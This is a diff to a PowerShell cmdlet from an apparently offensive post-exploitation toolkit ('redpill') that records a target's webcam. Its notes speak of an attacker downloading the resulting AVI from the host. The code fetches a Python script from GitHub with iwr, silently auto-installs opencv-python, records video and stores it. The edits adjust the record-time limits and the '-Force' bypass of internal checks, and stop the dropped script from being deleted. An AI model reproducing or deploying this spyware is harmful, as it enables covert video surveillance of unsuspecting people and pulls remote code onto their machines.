@@ -16,10 +16,9 @@
 .NOTES
    Remark: recording of webcam turns 'on' the camera ligth.
    Remark: cmdlet will auto-install 'opencv-python' package using pip3 (silent)
-   Parameter RecTime accepts values from 5 seconds (minimum) up to 60 seconds (max)
+   Parameter RecTime accepts values from 8 seconds (minimum) up to 60 seconds (max)
    to prevent the AVI file to be very large if attacker needs to download it from host.
-   Alternatively -Force 'true' parameter can be used to bypass cmdlet 'record time' and
-   internal cmdlet 'checks\tests' default configuration restrictions.
+   Remark: Invoke force 'true' to bypass cmdlet internal checks\tests to force execution.
 
 .Parameter RecTime
    The amount of time to rec in seconds (default: 10)
@@ -111,10 +110,9 @@ If(-not(Test-Path -Path "opencv.log") -and ($Force -ieq "false"))
    return
 }
 
-
 If($Force -ieq "false")
 {
-   $OPenCVTest = Get-Content -Path "opencv.log"
+   $OPenCVTest = Get-Content -Path "opencv.log" -Raw
    If(-not($OPenCVTest) -or ($OPenCVTest -iNotMatch 'True'))
    {
       write-host "x " -ForegroundColor Red -NoNewline
@@ -124,9 +122,9 @@ If($Force -ieq "false")
 
       write-host "  => " -ForegroundColor Yellow -NoNewline
       write-host "Installing:'" -ForegroundColor DarkGray -NoNewline
-      write-host "pip3 install opencv-python --quiet" -ForegroundColor Green -NoNewline
+      write-host "pip3 install opencv-python" -ForegroundColor Green -NoNewline
       write-host "'`n" -ForegroundColor DarkGray
-      echo y|pip3 install opencv-python --quiet --exists-action ignore #Auto-Install dependencies
+      echo y|pip3 install opencv-python --exists-action ignore #Auto-Install dependencies
       write-host ""
    }
 }
@@ -141,15 +139,12 @@ If(Test-Path -Path "$WorkingDir\outpy.avi")
    Remove-Item -Path "$WorkingDir\outpy.avi" -Force
 }
 
-If($Force -ieq "false")
+If($RecTime -gt 60 -or $RecTime -lt 8)
 {
-   If($RecTime -gt 60 -or $RecTime -lt 5)
-   {
-      write-host "  x " -ForegroundColor Red -NoNewline
-      write-host "NotOptimal: " -ForegroundColor DarkGray -NoNewline
-      write-host "RecTime, defaulting to 10 sec." -ForegroundColor DarkYellow
-      [int]$RecTime = '10'
-   }
+   write-host "  x " -ForegroundColor Red -NoNewline
+   write-host "NotOptimal: " -ForegroundColor DarkGray -NoNewline
+   write-host "record time, defaulting to 10 sec." -ForegroundColor Yellow
+   [int]$RecTime = '10'
 }
 
 
@@ -160,7 +155,7 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WebCam
 
 
 #Config python script
-$ReplaceMe = Get-Content -Path "$WorkingDir\WebCam.py" -Raw
+$ReplaceMe = Get-Content -Path "$WorkingDir\WebCam.py"
 $RegInstallPath = Get-ItemProperty -Path 'HKCU:\SOFTWARE\Python\PythonCore\***\InstallPath'|Select-Object -ExpandProperty '(default)'
 If(-not($RegInstallPath) -or ($RegInstallPath -eq $null))
 {
@@ -175,31 +170,20 @@ If(-not($RegInstallPath) -or ($RegInstallPath -eq $null))
    write-host "$Env:LOCALAPPDATA\Programs\python" -ForegroundColor Green
 }
 
+#Get python3 site-packages directory { bypass tests invoking -force 'true' }
 $PythonInstallPath = (Get-ChildItem -Path "$RegInstallPath" -Recurse -Force|Where-Object {$_.PSIsContainer -Match "True" -and $_.Name -iMatch 'site-packages'}).FullName
-If(-not($PythonInstallPath) -and ($Force -ieq "false"))
+If(-not($PythonInstallPath) -or ($Force -ieq "true"))
 {
-   write-host "x " -ForegroundColor Red -NoNewline
-   write-host "Error: " -ForegroundColor DarkGray -NoNewline
-   write-host "Python3 site-packages dir not found.`n" -ForegroundColor Red
-   return
+   $ParseRawData = Get-Content -Path "$WorkingDir\WebCam.py"|Select-Object -Skip 2
+   echo $ParseRawData > "$WorkingDir\WebCam.py"
 }
-
-If($PythonInstallPath)
+Else
 {
    #replace path in python script
    $ReplaceMe = $PythonInstallPath -replace '\\','\\'
    ((Get-Content -Path "$WorkingDir\WebCam.py" -Raw) -Replace "c:\\\\users\\\\pedro\\\\appdata\\\\local\\\\programs\\\\python\\\\python39\\\\lib\\\\site-packages","$ReplaceMe")|Set-Content -Path "$WorkingDir\WebCam.py" -Force
 }
-Else
-{
-   ## Fail to retrieve Python site-packages directory
-   # plus -force 'true' == Delete path from webcam.py
-   write-host "  + " -ForegroundColor Yellow -NoNewline
-   write-host "Force execution: " -ForegroundColor DarkGray -NoNewline
-   write-host "site-packages directory not found." -ForegroundColor DarkYellow
-   $ParseRawData = Get-Content -Path "$WorkingDir\WebCam.py" -Raw|Select-Object -Skip 2
-   echo $ParseRawData > "$WorkingDir\WebCam.py"
-}
+
 
 #Rename the output video.avi file
 ((Get-Content -Path "$WorkingDir\WebCam.py" -Raw) -Replace "outpy.avi","$FileName")|Set-Content -Path "$WorkingDir\WebCam.py" -Force
@@ -224,9 +208,8 @@ Stop-Process -Name "python3.*" -Force
 
 write-host "  + " -ForegroundColor DarkYellow -NoNewline
 write-host "Comverting webcam raw data to AVI format."
-
 Start-Sleep -Seconds 7 #Give some time to allow avi to finish
-Remove-Item -Path "$WorkingDir\WebCam.py" -Force
+#Remove-Item -Path "$WorkingDir\WebCam.py" -Force
 write-host "* " -ForegroundColor Green -NoNewline
 write-host "Storage: '" -ForegroundColor DarkGray -NoNewline
 write-host "${WorkingDir}\${FileName}" -ForegroundColor Green -NoNewline
